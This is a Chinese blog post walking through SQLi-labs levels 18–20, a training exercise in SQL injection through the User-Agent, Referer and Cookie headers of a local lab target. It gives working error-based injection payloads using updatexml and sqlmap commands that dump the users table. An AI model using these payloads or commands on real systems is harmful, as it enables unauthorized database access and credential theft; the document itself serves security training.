---
 title: Sqlilabs通关笔记(18-20)数据头注入
 date: 2020-01-07 12:32:50
 tags: SQL注入
 categories: SQL注入
---

## 第十八关 基于POST错误的Uagent字段数据头注入

![2020-1-7-12-45-44](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-12-45-44)
<!--more-->

### 注入点判断

1. 页面显示yourip应该是请求头的参数参入
2. 同时post传入并未有该参数
3. 用admin登录成功后发现有User-agents显示

![2020-1-7-12-57-43](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-12-57-43)

4. 无法使用hackbar插件提交了，需要用到burpsuit进行抓包提交
5. 抓包如下

![2020-1-7-12-58-2](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-12-58-2)

6. 在user-agent头上加单引号报错，确定user-agent注入了

![2020-1-7-13-1-5](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-13-1-5)

7. 通过单引号闭合进行payload构造

> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0)' and '1' = '1

8. 直接构造报错注入的payload

> User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0)' and (updatexml(1,concat(0x7e,user(),0x7e),1)) and '1' = '1

![2020-1-7-13-8-59](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-13-8-59)

## 第十九关 基于POST错误的Referer字段数据头注入

1.同理，本关的注入点在Referer参数，payload一样只是参数位置不同

![2020-1-7-13-13-16](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-13-13-16)

## 第二十关 基于POST错误的Cookie-Uagent字段数据头注入

1.同理，本关的注入点在cookie参数，payload一样只是参数位置不同

> Cookie: uname=admin' and (updatexml(1,concat(0x7e,user(),0x7e),1)) and '1' = '1

![2020-1-7-13-19-53](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-13-19-53)

### SQLMAP注入

1. 可以直接使用-r进行对抓取的数据包进行检测
**在user-agent这个需要检测的参数上加上*号**

![2020-1-7-13-44-57](https://raw.githubusercontent.com/bbkali/picbad/master/2020-1-7-13-44-57)

> sqlmap -r "2.txt" -D security -T users --columns --dump --batch --technique E --batch --level 3 --threads 10

2. 也可以直接通过user-agent注入,时间可能稍长一些
> sqlmap -u "http://127.0.0.1/sqlilabs2/Less-18/" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0' and '1'='1" --level 3 --threads 10 --dbms mysql --fresh-queries --flush-session -D security -T users --columns --dump --batch --technique E

* **--level** 

level: 设置检测的方方面面和测试用例
    - 默认是1,会尝试POST和GET
    - 2:Cookie也会加入检测
    - 3:User-Agent和Referer也会检测, 更大的值会增加用例量

* **--user-agent**

指定User-Agent

* **--data**

指定请求的内容

* **--dbms**

指定后端数据库,给定后端数据库的类型可以减少减少无关的测试用例.

* **--fresh-queries** 

fresh-queries会忽略之前的查询结果,进行重新请求操作

* **--flush-session**

flush-session会清空当前URL相关的session